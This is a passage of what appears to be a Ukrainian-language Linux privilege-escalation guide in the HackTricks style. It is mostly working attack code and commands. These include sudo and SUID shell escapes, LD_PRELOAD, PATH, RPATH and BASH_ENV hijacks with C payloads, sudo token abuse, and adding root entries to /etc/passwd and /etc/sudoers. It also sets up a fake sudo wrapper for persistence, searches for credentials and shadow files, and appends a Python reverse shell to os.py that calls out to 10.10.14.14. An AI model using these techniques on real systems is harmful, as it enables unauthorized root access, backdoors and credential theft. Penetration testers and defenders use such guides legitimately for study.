Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожного користувача**, використовуючи цей пароль.

### Su Brute

Якщо вам не шкода створювати багато шуму і на машині присутні бінарні файли `su` і `timeout`, ви можете спробувати brute-force користувача, використовуючи [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваними елементами $PATH

### $PATH

Якщо ви виявите, що можете **записувати всередину якоїсь папки з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній папці** з назвою якоїсь команди, яка буде виконана іншим користувачем (ідеально — root) і яка **не завантажується з папки, що розташована перед** вашою записуваною папкою в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду через sudo або вона може мати suid біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певні команди з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, і тепер тривіально отримати shell, додавши ssh key у директорію `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **set an environment variable** під час виконання чого-небудь:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python бібліотеку під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код від імені root при виклику дозволеної команди.

- Why it works: Для неінтерактивних shell Bash оцінює `$BASH_ENV` і підключає (sources) цей файл перед виконанням цільового скрипта. Багато sudo правил дозволяють запускати скрипт або обгортку shell. Якщо `BASH_ENV` зберігається sudo, ваш файл буде підключений з привілеями root.

- Requirements:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
- Уникайте shell wrappers для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте логування вводу/виводу sudo та оповіщення, коли використовуються збережені змінні оточення.

### Sudo — шляхи обходу виконання

**Jump** щоб читати інші файли або використовувати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказаного шляху до команди

Якщо користувачу надано **sudo permission** для однієї команди **без вказівки шляху**: _hacker10 ALL= (root) less_ , ви можете це експлуатувати, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використати, якщо **suid** бінарний файл **виконує іншу команду без вказування шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID бінарного файлу)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл із вказаним шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію та export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох shared libraries (.so files), які мають бути завантажені loader'ом перед усіма іншими, включно зі стандартною C-бібліотекою (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти зловживанню цією функцією, особливо щодо **suid/sgid** виконуваних файлів, система накладає певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких real user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для виконуваних файлів з **suid/sgid** попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають **suid/sgid**.

Privilege escalation може виникнути, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Ця конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися і визнаватися навіть при виконанні команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, запустивши **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Схожий privesc може бути зловживаний, якщо зловмисник контролює env variable **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на бінарний файл з **SUID**-дозволами, що виглядає незвично, рекомендується перевірити, чи він правильно завантажує **.so** файли. Це можна зробити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, якщо з'являється помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, це може свідчити про потенційну можливість експлуатації.

Щоб експлуатувати це, слід створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання правами доступу до файлів та виконання shell з підвищеними привілеями.

Скомпілюйте вищенаведений C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, що дозволить потенційну компрометацію системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID бінарний файл, який завантажує бібліотеку з папки, у яку ми можемо записувати, давайте створимо бібліотеку в тій папці з необхідним іменем:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що бібліотека, яку ви згенерували, повинна містити функцію з іменем `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix-бінарників, які можуть бути використані зловмисником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише вставити аргументи** в команду.

Проєкт збирає легітимні функції Unix-бінарів, якими можна зловживати, щоб виходити з обмежених shells, escalate або підтримувати elevated privileges, передавати файли, породжувати bind and reverse shells та сприяти іншим post-exploitation завданням.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **чекаючи виконання команди sudo і потім перехопивши session token**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell під користувачем "_sampleuser_"
- "_sampleuser_" вже **використовував `sudo`** для виконання чогось протягом **останніх 15mins** (за замовчуванням це тривалість sudo token-а, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди, змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_, **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers file**, який зробить **sudo tokens вічними і дозволить усім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** у папці або на будь-якому зі створених у ній файлів, ви можете скористатися бінарником [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для user та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell від імені того user з PID 1234, ви можете **obtain sudo privileges** без необхідності знати password, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише user root та group root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **отримати підвищені привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD — не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для ескалації привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, запускався ваш sudo-виконуваний файл.

Зверніть увагу, що якщо користувач використовує інший shell (не bash), доведеться змінити інші файли, щоб додати новий шлях. Наприклад [sudo-piggyback](https://github.com/APTy/sudo-piggyback) модифікує `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільні бібліотеки

### ld.so

The file `/etc/ld.so.conf` indicates **де знаходяться файли конфігурації, які будуть завантажені**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. Ці файли конфігурації **вказують на інші папки**, де будуть **шукатися** **бібліотеки**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки всередині `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Погляньте, як **експлуатувати цю неправильно налаштовану конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши lib у `/var/tmp/flag15/`, програма використовуватиме його в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних привілеїв root**. Це фактично розбиває привілеї root на **менші й відмінні одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

У директорії біт **"execute"** означає, що відповідний користувач може **"cd"** у цю папку.\
Біт **"read"** означає, що користувач може **переглядати список** **файлів**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Access Control Lists (ACLs) представляють другий шар дискреційних дозволів, здатний **перекривати традиційні дозволи ugo/rwx**. Ці дозволи покращують контроль доступу до файлу чи директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або членами групи. Такий рівень **деталізації забезпечує більш точне керування доступом**. Докладніше див. [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачеві "kali" права читання та запису для файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell сесії

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **найновіших версіях** ви зможете **connect** тільки до screen сесій **свого користувача**. Однак, ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелік screen сесій**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Мені не вдалося перехопити сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелік сеансів tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu, etc) між September 2006 та May 13th, 2008 можуть бути уражені цією вразливістю.\
Ця помилка виникає при створенні нового ssh ключа в цих ОС, оскільки **було можливих лише 32,768 варіацій**. Це означає, що всі можливості можна перерахувати і, **маючи публічний ssh ключ, ви можете знайти відповідний приватний ключ**. Ви можете знайти обчислені можливості тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена автентифікація за паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена автентифікація за публічним ключем. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо автентифікація за паролем дозволена, вказує, чи дозволяє сервер вхід у облікові записи з порожнім паролем. За замовчуванням — `no`.

### PermitRootLogin

Вказує, чи може root виконувати вхід через ssh, за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти, використовуючи пароль та приватний ключ
- `without-password` or `prohibit-password`: root може входити лише з приватним ключем
- `forced-commands-only`: root може увійти лише з приватним ключем і якщо вказані параметри команд
- `no`: заборонено

### AuthorizedKeysFile

Вказує файли, що містять публічні ключі, які можуть бути використані для автентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **шляхи відносно домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти за допомогою **private** ключа користувача «**testusername**», ssh порівняє публічний ключ з ключами, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) на сервері. Таким чином ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` є `*`, то щоразу, коли користувач підключається до іншої машини, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете скористатися цим, щоб підвищити привілеї**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, що виконуються при запуску користувачем нового shell**. Тому, якщо ви можете **записувати або змінювати будь-який із них, ви можете підвищити права**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий профільний скрипт, перевірте його на наявність **чутливих даних**.

### Passwd/Shadow Files

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати їхні резервні копії. Тому рекомендовано **знайти всі такі файли** та **перевірити, чи можна їх прочитати**, щоб побачити, **чи є в них хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або еквівалентному) можна знайти **password hashes**.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Файл /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наведених команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і встановіть згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Як альтернативу, ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` знаходиться в `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Ви повинні перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано при наступному запуску tomcat.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/Бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **декілька можливих файлів, які можуть містити паролі**.\
**Інший цікавий інструмент**, який ви можете використовувати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це програма з відкритим кодом, яка використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти **цікаву/конфіденційну інформацію всередині них**. Чим дивніший лог, тим цікавішим він, ймовірно, буде.\
Також деякі "**погано**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснюється в цьому дописі: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати logs**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Варто також перевіряти файли, які містять слово "**password**" у своїй **назві** або всередині **вмісту**, а також шукати IP-адреси та email-и у логах, або хеші за регулярними виразами.\
Я не буду тут перераховувати, як робити все це, але якщо цікаво, можна перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте **звідки** буде виконано python-скрипт і ви **можете записувати всередині** тієї папки або можете **змінювати python бібліотеки**, ви можете модифікувати бібліотеку os і backdoor її (якщо ви можете записувати туди, де буде виконуватись python-скрипт, скопіюйте та вставте бібліотеку os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація Logrotate

